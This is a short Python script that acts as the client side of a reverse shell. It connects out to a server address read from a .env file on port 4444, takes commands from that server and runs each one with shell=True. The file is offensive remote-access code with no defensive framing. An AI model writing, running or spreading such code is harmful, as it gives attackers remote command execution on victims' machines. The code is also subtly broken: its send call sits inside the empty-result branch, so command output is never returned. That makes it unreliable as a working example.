import sys
import socket
import subprocess
import os
from dotenv import load_dotenv


    #USE .env FOR YOUR PRIVACY

load_dotenv()

SERVER_IP = os.getenv("SERVER_IP")
PORT = 4444

s = socket.socket()
s.connect((SERVER_IP,PORT)) # CREATE AN CONNECTION BETWEEN C & S
msg = s.recv(1024).decode()# RECEVIES THE MSG FROM SERVER ADN DECODES

print(f'[*] server: ',msg)

while True:
    cmd  = s.recv(1024).decode()
    print(f'[+] Recived command : {cmd}')

    if cmd.lower() in ['exit','q','e','quit']:
        break

    try : 
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True) # SHELL CONTROL
        print(result)

    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = '[+] Excecuted Succesfully'.encode()
        s.send(result)    

s.close() # CLOSES THE CONNECTION AFTER THE COMMAND FROM THE SERVER
